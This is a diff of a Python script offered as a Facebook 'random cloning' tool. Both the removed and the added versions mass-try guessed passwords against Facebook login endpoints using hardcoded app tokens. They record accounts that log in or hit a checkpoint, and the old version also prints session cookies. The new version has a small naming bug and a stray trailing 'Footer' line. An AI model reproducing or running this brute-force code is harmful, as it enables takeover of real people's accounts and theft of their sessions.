@@ -1,129 +1,103 @@
 #WRITTEN BY MANJAKA
-#FOLLOW : https://github.com/MANJAKA-305
-#------------- import -------------#
+#FOLLOW MY GITHUB : https://github.com/MANJAKA-305
+#----------import----------#
 import os
-from os import system as clr
-import random
-import string 
-from concurrent.futures import ThreadPoolExecutor as tred
-import requests
-import re
-import sys
+from time import sleep as slp
+from concurrent.futures import ThreadPoolExecutor as ted
 import uuid
+import random 
+import httpx
 import json
-#-------------color----------------#
-bblack="\033[1;30m"         # Black
-M="\033[1;31m"            # Red
-H="\033[1;32m"         # Green
-byellow="\033[1;33m"        # Yellow
-bblue="\033[1;34m"          # Blue
-P="\033[1;35m"        # Purple
-C="\033[1;36m"          # Cyan
-B="\033[1;37m"         # White
-my_color = [
- B,C,P,H]
-warna = random.choice(my_color)
+import sys
+#----------logo----------#
+logo=('''                                                                                                      
+`7MM"""Mq. MMP""MM""YMM `7MMM.     ,MMF'
+  MM   `MM.P'   MM   `7   MMMb    dPMM  
+  MM   ,M9      MM        M YM   ,M MM  
+  MMmmdM9       MM        M  Mb  M' MM  
+  MM  YM.       MM        M  YM.P'  MM  
+  MM   `Mb.     MM        M  `YM'   MM  
+.JMML. .JMM.  .JMML.    .JML. `'  .JMML. ''')
+#----------clear----------#
+def clear():
+    os.system('clear')
+    print(logo)
+    print(42*'-')
+    print(' FB :ʚʬɞ Manjaka Rodry ʚʬɞ ')
+    print(' GITHUB  : MANJAKA-305')
+    print(42*'-')
+#----------line----------#
+def line():
+    print(42*'-')
+#----------menu----------#
+def main():
+    clear()
+    print(' [01] RANDOM CLONING ')
+    print(' [00] EXIT ')
+    line()
+    option=input(' [??] CHOICE MENU : ')
+    if option in [ '1']:
+        __file__()
+    else:
+        exit(' THANKS FOR USING ')
+#----------file----------#
+def __file__():
+    clear()
+    filex=input(' [??] ENTER FILE PATH : ')
+    try:
+        fo=open(filex,'r').read().splitlines()
+    except FileNotFoundError:
+        print(' File not found !!');slp(2)
+        __file__()
+    clear()
+    try:
+        pas_limit=int(input(' [??] ENTER PASSWORD LIMIT (1-20) : '))
+    except:
+        pas_limit=1
+    line()
+    pas_list=[]
+    for i in range(pas_limit):
+        pasx=input(f' [??] ENTER PASSWORD {i+1} : ')
+        pas_list.append(pasx)
+    with ted(max_workers=30) as Manjaka:
+        tl=str(len(fo))
+        clear()
+        print(' TOTAL ACCOUNT : '+tl)
+        print(' USE AIRPLANE MODE FOR SPEED UP')
+        line()
+        for user in fo:
+            ids,names=user.split('|')
+            passlist=pas_list
+            Dipto.submit(m1,ids,names,passlist)
+    line()
+    print(' THE PROCESS HAS BEEN COMPLETE')
+    input(' PRESS ENTER TO BACK : ')
+    main()
+loop=0
 oks=[]
 cps=[]
-loop=0
-#-------------logo-----------------#
-logo=(f'''{B}
-`7MM"""Mq. MMP""MM""YMM `7MMM.     ,MMF'
-{warna}  MM   `MM.P'   MM   `7   MMMb    dPMM  
-{B}  MM   ,M9      MM        M YM   ,M MM  
-{warna}  MMmmdM9       MM        M  Mb  M' MM
- {B} MM  YM.       MM        M  YM.P'  MM  
-{warna}  MM   `Mb.     MM        M  `YM'   MM  
-{B}.JMML. .JMM.  .JMML.    .JML. `'  .JMML.
-{warna}--------------------------------------------{B}
- Owner    : {C}MANJAKA{B}
- Guthub   : MANJAKA-305
- Facebook : ʚʬɞ Manjaka Rodry ʚʬɞ 
- Tools    : R{C}/{B}T{C}/{B}M{M} •{warna}[{H}TRAIL{warna}]{warna}
---------------------------------------------{B}''')
-#-------------linex def -------------#
-def linex():
-    print(f'{warna}--------------------------------------------{B}')
-#-------------clear def -------------#
-def clear():
-    clr('clear')
-    print(logo)
-#-------------main def------------#
-def MANJAKA():
-    clear()
-    os.system('xdg-open https://github.com/MANJAKA-305')
-    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
-    print(f'{B} [{warna}00{B}] EXIT  ')
-    linex()
-    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
-    if option in ['01','1']:
-        BD_CLONING()
-    else:
-        exit(' Thanks for using dear :)')
-#------------- bd clone def ----------#
-def BD_CLONING():
-    user=[]
-    clear()
-    print(' EXAMPLE SIM CODE : [] [011] [012] [013]')
-    code=input(' ENTER SIM CODE >> ')
-    linex()
-    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000] [50000]')
+#----------method------------#
+def m1(ids,names,passlist):
+    global oks,loop
     try:
-        limit=int(input(' ENTER LIMIT >> '))
-    except ValueError:
-        limit=50000
-    clear()
-    for nmbr in range(limit):
-        nmp=''.join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    with tred(max_workers=30) as Dipto:
-        tl=str(len(user))
-        print(' TOTAL ACCOUNT : '+tl)
-        print(' YOUR SIM CODE : '+code)
-        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
-        linex()
-        for psx in user:
-            ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
-            Dipto.submit(method_crack,ids,passlist)
-    linex()
-    print(' THE PROGRESS HAS BEEN COMPLETE ')
-    print(' TOTAL OK ID '+str(len(oks)))
-    print(' TOTAL CP ID '+str(len(cps)))
-    input(' PRESS ENTER TO BACK  : ')
-    MR_DIPTO()
-#------------ method crack def ---------#
-def method_crack(ids,passlist):
-    global oks
-    global cps
-    global loop
-    try:
-        for pas in passlist:
-            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
-            sys.stdout.flush()
-            adid=str(uuid.uuid4())
-            device_id=str(uuid.uuid4())
-            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
-            url='https://api.facebook.com/method/auth.login'
-            reqx=requests.post(url,data=datax,headers=header).json()
-            if 'session_key' in reqx:
-                try:
-                    uid=reqx['uid']
-                except:
-                    uid=ids
-                if str(uid) in oks:
-                    break
-                else:
-                    print('\r\r \033[1;32m[MADA-OK] '+str(uid)+' | '+pas+'\033[1;37m')
-                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
-                    print('\033[1;32m [COOKIES] '+coki)
-                    open('/sdcard/manjaka.txt','a').write(str(uid)+' | '+pas+'\n')
-                    oks.append(str(uid))
-                    break
-            elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;30m[MADA-CP] '+ids+' | '+pas+'\033[1;37m')
-                open('/sdcard/manjaka.txt','a').write(ids+'|'+pas+'\n')
+        fn=names.split(' ')[0]
+        try:
+            ln=names.split(' ')[1]
+        except:
+            ln=fn
+        for pw in passlist:
+            sys.stdout.write('\r\r [RUNNING] %s|ALIVE:%s '%(loop,len(oks)));sys.stdout.flush()
+            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+            head={'User-Agent': '[FBAN/FB4A;FBAV/15.0.0.912;FBBV/3800125;[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+            url='https://b-graph.facebook.com/auth/login'
+            req=httpx.post(url,data=data,headers=head).json()
+            if 'session_key' in req:
+                print('\r\r [ALIVE] '+ids+'|'+pas)
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in req['error']['message']:
+                print('\r\r [CHECKPOINT] '+ids+'|'+pas)
                 cps.append(ids)
                 break
             else:
@@ -131,5 +105,6 @@ def method_crack(ids,passlist):
         loop+=1
     except:
         pass
-#-------------end----------------#
-MANJAKA()
+#----------end----------#
+main()
+Footer
